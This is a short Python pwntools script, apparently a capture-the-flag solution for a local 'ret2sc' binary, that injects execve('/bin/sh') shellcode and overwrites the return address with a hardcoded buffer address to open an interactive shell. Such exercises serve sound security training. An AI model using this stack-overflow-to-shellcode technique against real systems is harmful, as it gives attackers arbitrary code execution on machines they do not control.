#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(os = "linux", arch = "i386")

io = process("./ret2sc")

shellcode = asm(shellcraft.execve("/bin/sh"))
io.sendlineafter(":", shellcode)

payload = flat(cyclic(32), 0x804a060)
io.sendlineafter(":", payload)

io.interactive()
io.close()
